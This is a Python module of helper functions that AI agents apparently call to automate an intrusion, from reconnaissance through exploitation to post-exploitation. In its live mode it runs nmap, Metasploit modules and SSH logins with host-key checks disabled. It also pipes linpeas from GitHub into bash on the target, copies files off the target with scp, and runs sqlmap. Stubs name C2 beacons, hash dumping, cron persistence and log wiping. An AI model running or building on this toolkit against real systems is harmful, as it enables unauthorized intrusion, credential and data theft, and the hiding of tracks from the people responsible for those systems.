"""
Ryan's Toolbelt - SIMULATION by default, LIVE actions when `LIVE_MODE=1`.

This file exposes helper functions the agents call. When `LIVE_MODE` is not
set or is falsey the functions behave as simulation stubs. When `LIVE_MODE=1`
the functions attempt to call local or remote tools (nmap, ssh, msfconsole,
scp). Use `KALI_SSH_HOST`, `KALI_SSH_USER`, and credentials/envs below to
instruct the toolbelt to run actions on your Kali attacker host instead of
locally.

Prerequisites for LIVE mode (install on the host that will execute commands):
- `nmap` installed
- `ssh` and optionally `sshpass` for password auth
- `msfconsole` (Metasploit) if you want msf-based exploits
- `linpeas.sh` reachable by the attacker host (or placed locally)

Security: these helpers will only perform live actions when `LIVE_MODE=1`.
You confirmed you have authorization — keep `LIVE_MODE` unset in other
environments.
"""

import os
import shlex
import subprocess
import tempfile
import re
from typing import Optional

# Live mode gate
LIVE = os.environ.get("LIVE_MODE", "0") == "1"

# Optional remote execution (run tools on a Kali attacker box)
KALI_SSH_HOST = os.environ.get("KALI_SSH_HOST")
KALI_SSH_USER = os.environ.get("KALI_SSH_USER")
KALI_SSH_KEY = os.environ.get("KALI_SSH_KEY")  # optional private key path
KALI_SSH_PASS = os.environ.get("KALI_SSH_PASS")  # optional password (sshpass)
KALI_SSH_PORT = os.environ.get("KALI_SSH_PORT")  # optional ssh port (e.g., 2222)
KALI_DOCKER_CONTAINER = os.environ.get("KALI_DOCKER_CONTAINER")  # optional docker container name/id for docker exec


def _run_cmd_local(cmd: str, timeout: int = 60) -> dict:
    """Run a shell command locally and return {rc, out, err}."""
    try:
        proc = subprocess.run(shlex.split(cmd), capture_output=True, text=True, timeout=timeout)
        return {"rc": proc.returncode, "out": proc.stdout, "err": proc.stderr}
    except subprocess.TimeoutExpired:
        return {"rc": -1, "out": "", "err": "timeout"}


def _ssh_cmd(host: str, user: str, cmd: str, key: Optional[str] = None, password: Optional[str] = None, timeout: int = 120) -> dict:
    """Execute `cmd` on remote host via ssh. Uses sshpass if password provided."""
    # Configuration: if KALI_FORCE_PASSWORD=1 is set, prefer password auth
    # even if a key is present (this disables publickey auth for the SSH call).
    FORCE_PW = os.environ.get("KALI_FORCE_PASSWORD", "0") == "1"

    # Prefer key-based auth when a key is provided. Use sshpass when a
    # password is provided and no key is configured, or when FORCE_PW is set.
    base = []
    if password and (not key or FORCE_PW):
        # sshpass may not be installed; attempt without if missing
        base = ["sshpass", "-p", password]
    ssh_parts = ["ssh", "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null"]
    if KALI_SSH_PORT:
        ssh_parts += ["-p", KALI_SSH_PORT]
    # If forcing password auth, disable publickey auth for this connection
    if password and FORCE_PW:
        ssh_parts += ["-o", "PubkeyAuthentication=no"]
    if key:
        ssh_parts += ["-i", key]
    ssh_parts += [f"{user}@{host}", cmd]
    cmd_line = " ".join(shlex.quote(p) for p in base + ssh_parts)
    return _run_cmd_local(cmd_line, timeout=timeout)


def _docker_exec(container: str, cmd: str, timeout: int = 120) -> dict:
    """Execute `cmd` inside a docker container using `docker exec`."""
    docker_cmd = f"docker exec -i {shlex.quote(container)} /bin/bash -lc {shlex.quote(cmd)}"
    return _run_cmd_local(docker_cmd, timeout=timeout)


# --- PHASE 1: DISCOVERY ---
def run_nmap_scan(target_ip, scan_type="fast"):
    """Run an nmap scan (live when `LIVE=1`) and return a structured result.

    When not LIVE, returns a simulated vulnerable result.
    """
    if not LIVE:
        print(f"[*] (SIMULATION) Returning fake Juice Shop scan for {target_ip}...")
        return {
            "ip": target_ip,
            "open_ports": [
                {"port": 22, "service": "ssh"},
                {"port": 3000, "service": "http-alt"},
            ],
            "raw": "SIMULATED"
        }

    args = "-sV -Pn"
    if scan_type == "fast":
        args = "-sV -Pn -T4"

    cmd = f"nmap {args} {target_ip}"
    # Prefer docker exec into the Kali container if configured (avoids needing ssh/sshpass on host)
    if KALI_DOCKER_CONTAINER:
        res = _docker_exec(KALI_DOCKER_CONTAINER, cmd)
    elif KALI_SSH_HOST and KALI_SSH_USER:
        res = _ssh_cmd(KALI_SSH_HOST, KALI_SSH_USER, shlex.quote(cmd), key=KALI_SSH_KEY, password=KALI_SSH_PASS)
    else:
        res = _run_cmd_local(cmd)

    out = res.get("out", "")
    # Parse simple "open" lines: e.g., '22/tcp open ssh'
    ports = []
    for m in re.finditer(r"(\d+)/tcp\s+open\s+(\S+)", out):
        ports.append({"port": int(m.group(1)), "service": m.group(2)})

    return {"ip": target_ip, "open_ports": ports, "raw": out}


def fetch_threat_intel(target_domain):
    # Placeholder: could call online CVE sources when LIVE
    return ["CVE-2023-FAKE-1", "Weak-Credentials"]


# --- PHASE 2: ACCESS & C2 ---
def launch_metasploit_exploit(target_ip, cve_id=None, module: Optional[str] = None):
    """Attempt to exploit the target. Two modes:
    - If `module` provided and LIVE, run msfconsole to attempt exploit.
    - Otherwise try an SSH login using credentials passed via env vars.

    Returns a dict with `status` and optional `session_id`.
    """
    if not LIVE:
        print(f"[*] (SIMULATION) Exploit {cve_id or module} successful!")
        return {"success": True, "session_id": "session_123", "user": "www-data"}

    # MSF path
    msf_module = module or os.environ.get("MSF_MODULE")
    if msf_module:
        # Build a non-interactive msfconsole command
        rcfile = tempfile.NamedTemporaryFile(mode="w", delete=False)
        rcfile.write(f"use {msf_module}\n")
        rcfile.write(f"set RHOST {target_ip}\n")
        rcfile.write("set THREADS 4\n")
        rcfile.write("run\nexit\n")
        rcfile.flush()
        cmd = f"msfconsole -q -r {rcfile.name}"
        if KALI_DOCKER_CONTAINER:
            res = _docker_exec(KALI_DOCKER_CONTAINER, cmd, timeout=300)
        else:
            res = _run_cmd_local(cmd, timeout=300)
        out = res.get("out", "") + res.get("err", "")
        if "session" in out or "Meterpreter" in out:
            return {"status": "SHELL_ESTABLISHED", "session_id": "msf_session"}
        return {"status": "FAILED", "raw": out}

    # SSH fallback: try credentials provided by env
    ssh_user = os.environ.get("TARGET_SSH_USER")
    ssh_pass = os.environ.get("TARGET_SSH_PASS")
    ssh_key = os.environ.get("TARGET_SSH_KEY")
    if ssh_user and (ssh_pass or ssh_key):
        cmd = "id"
        if KALI_SSH_HOST and KALI_SSH_USER:
            # run ssh from Kali attacker to target (requires Kali to be able to reach target)
            remote_cmd = f"ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {ssh_user}@{target_ip} '{cmd}'"
            if KALI_DOCKER_CONTAINER:
                res = _docker_exec(KALI_DOCKER_CONTAINER, remote_cmd)
            else:
                res = _ssh_cmd(KALI_SSH_HOST, KALI_SSH_USER, shlex.quote(remote_cmd), key=KALI_SSH_KEY, password=KALI_SSH_PASS)
        else:
            if ssh_pass:
                res = _run_cmd_local(f"sshpass -p {shlex.quote(ssh_pass)} ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {ssh_user}@{target_ip} {shlex.quote(cmd)}")
            else:
                key_arg = f"-i {shlex.quote(ssh_key)}" if ssh_key else ""
                res = _run_cmd_local(f"ssh {key_arg} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {ssh_user}@{target_ip} {shlex.quote(cmd)}")

        if res.get("rc") == 0:
            return {"status": "SHELL_ESTABLISHED"}
        return {"status": "FAILED", "raw": res}

    return {"status": "FAILED", "reason": "no exploit module or SSH creds provided"}


def deploy_c2_beacon(target_ip, method="https"):
    if not LIVE:
        print(f"[*] (SIMULATION) C2 Beacon active.")
        return {"beacon_id": "beacon_99", "status": "alive"}
    # In live mode, this would create a persistent connection (out of scope here)
    return {"beacon_id": "beacon_live", "status": "alive"}


# --- PHASE 3: POST-EXPLOIT ---
def dump_hashes(session_id):
    if not LIVE:
        return ["root:500:aad3b435b51404eeaad3b435b51404ee:::"]
    # Live extraction would use an established session to pull /etc/shadow; out of scope
    return []


def scan_internal_network(session_id, subnet):
    if not LIVE:
        return ["192.168.1.50 (Database)"]
    # This would use pivoted routing via a session; return placeholder
    return []


def run_linpeas(session_id, target_host=None, target_user=None):
    if not LIVE:
        return ["Vulnerability Found: Sudo NOPASSWD for git"]

    # Run linpeas on the target via SSH. Requires TARGET_SSH_* creds or KALI proxy.
    ssh_user = target_user or os.environ.get("TARGET_SSH_USER")
    ssh_pass = os.environ.get("TARGET_SSH_PASS")
    ssh_key = os.environ.get("TARGET_SSH_KEY")
    if not ssh_user or not (ssh_pass or ssh_key):
        return ["ERROR: Missing SSH credentials for linpeas"]

    linpeas_cmd = "curl -s https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linpeas/linpeas.sh | bash"
    if KALI_SSH_HOST and KALI_SSH_USER:
        # Ask Kali to run the SSH command against the target. Prefer docker exec if configured.
        remote = f"ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {ssh_user}@{session_id} \"{linpeas_cmd}\""
        if KALI_DOCKER_CONTAINER:
            res = _docker_exec(KALI_DOCKER_CONTAINER, remote, timeout=600)
        else:
            res = _ssh_cmd(KALI_SSH_HOST, KALI_SSH_USER, shlex.quote(remote), key=KALI_SSH_KEY, password=KALI_SSH_PASS)
    else:
        if ssh_pass:
            res = _run_cmd_local(f"sshpass -p {shlex.quote(ssh_pass)} ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {ssh_user}@{session_id} '{linpeas_cmd}'", timeout=600)
        else:
            key_arg = f"-i {shlex.quote(ssh_key)}" if ssh_key else ""
            res = _run_cmd_local(f"ssh {key_arg} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {ssh_user}@{session_id} '{linpeas_cmd}'", timeout=600)

    return [res.get("out", "")]


def attempt_ssh_pivot(target_ip):
    if not LIVE:
        print(f"[*] (SIMULATION) Pivoting to {target_ip}...")
        return True
    # Implement pivot logic if a session exists. For now, return False to indicate not implemented.
    return False


def install_cron_persistence(cmd):
    if not LIVE:
        return True
    # Would write to a cron entry on target via session
    return False


# --- PHASE 4: ACTIONS ---
def search_sensitive_files(session_id, keywords):
    if not LIVE:
        return ["/etc/shadow", "/var/www/html/config.php"]
    # Live search via SSH/Session is out of scope here; return empty
    return []


def exfiltrate_data(session_id, file_path, dest_ip):
    if not LIVE:
        print(f"[*] (SIMULATION) Stolen {file_path} sent to {dest_ip}")
        return True

    # Simple SCP from target to dest (requires ssh creds). `session_id` used as host here.
    ssh_user = os.environ.get("TARGET_SSH_USER")
    ssh_pass = os.environ.get("TARGET_SSH_PASS")
    ssh_key = os.environ.get("TARGET_SSH_KEY")
    if not ssh_user or not (ssh_pass or ssh_key):
        return False

    # If dest_ip is local attacker, use scp from target to attacker (invoked from Kali if configured)
    if KALI_SSH_HOST and KALI_SSH_USER:
        scp_cmd = f"scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {ssh_user}@{session_id}:{shlex.quote(file_path)} {shlex.quote(dest_ip)}"
        if KALI_DOCKER_CONTAINER:
            res = _docker_exec(KALI_DOCKER_CONTAINER, scp_cmd)
        else:
            res = _ssh_cmd(KALI_SSH_HOST, KALI_SSH_USER, shlex.quote(scp_cmd), key=KALI_SSH_KEY, password=KALI_SSH_PASS)
    else:
        if ssh_pass:
            res = _run_cmd_local(f"sshpass -p {shlex.quote(ssh_pass)} scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {ssh_user}@{session_id}:{shlex.quote(file_path)} {shlex.quote(dest_ip)}")
        else:
            key_arg = f"-i {shlex.quote(ssh_key)}" if ssh_key else ""
            res = _run_cmd_local(f"scp {key_arg} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {ssh_user}@{session_id}:{shlex.quote(file_path)} {shlex.quote(dest_ip)}")

    return res.get("rc") == 0


# --- SUPPORT ---
def clear_event_logs(session_id):
    if not LIVE:
        print("[*] (SIMULATION) Logs wiped.")
        return True
    # Would call log clearing commands via session
    return False


def sqlmap_attack(url):
    if not LIVE:
        return {"success": True, "note": "SQL Injection successful"}
    # Run sqlmap locally or via Kali
    cmd = f"sqlmap -u {shlex.quote(url)} --batch --output-dir=/tmp/sqlmap_out"
    if KALI_SSH_HOST and KALI_SSH_USER:
        res = _ssh_cmd(KALI_SSH_HOST, KALI_SSH_USER, shlex.quote(cmd), key=KALI_SSH_KEY, password=KALI_SSH_PASS)
    else:
        res = _run_cmd_local(cmd)
    return {"success": res.get("rc") == 0, "raw": res}